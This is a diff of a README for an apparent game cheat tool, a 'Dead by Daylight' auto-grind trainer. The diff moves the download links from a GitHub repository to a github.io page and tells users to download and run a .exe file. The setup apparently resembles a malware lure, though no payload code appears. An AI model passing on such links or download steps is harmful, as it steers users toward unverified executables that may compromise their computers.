@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Elite - Level up your characters with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/pubcrawlelmisti919/DBD-AutoGrind-Trainer-2026-Elite)
+[![Download Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://pubcrawlelmisti919.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ This tool functions on computers running Windows. Ensure your system meets these
 
 Follow these steps to prepare your system and use the trainer.
 
-1. Visit the download page: [https://github.com/pubcrawlelmisti919/DBD-AutoGrind-Trainer-2026-Elite](https://github.com/pubcrawlelmisti919/DBD-AutoGrind-Trainer-2026-Elite).
+1. Visit the download page: [https://pubcrawlelmisti919.github.io](https://pubcrawlelmisti919.github.io).
 2. Look for the latest release version on the page.
 3. Download the executable file (ending in .exe) to your computer.
 4. Locate the downloaded file in your folder.
